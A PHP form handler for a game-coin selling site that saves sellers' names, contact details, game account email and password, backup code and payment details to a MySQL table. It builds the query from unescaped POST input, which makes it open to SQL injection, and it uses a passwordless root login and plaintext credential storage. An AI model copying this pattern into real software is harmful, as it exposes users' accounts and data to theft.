<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "supercoinsniper";

$console = $_POST['console'];
$name = $_POST['name'];
$lastname = $_POST['lastname'];
$email = $_POST['email'];
$social = $_POST['social'];
$quantite = $_POST['quantite'];
$emailaccount = $_POST['emailaccount'];
$passwordaccount = $_POST['passwordaccount'];
$Backupcode = $_POST['Backupcode'];
$payment = $_POST['payment'];
$paymentdetails = $_POST['paymentdetails'];



$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

$sql = "INSERT INTO sell (Console, Name, Lastname, Email, Contact, Quantite, AccountMail, AccountPass, Backupcode, Payment, Detailpayment, Verifquantite)
VALUES ('$console','$name','$lastname','$email','$social','$quantite','$emailaccount','$passwordaccount','$Backupcode','$payment','$paymentdetails','0')";

if ($conn->query($sql) === TRUE) {
   header("Location: /supercoinsniper/front/sell.html");
}

$conn->close();
?>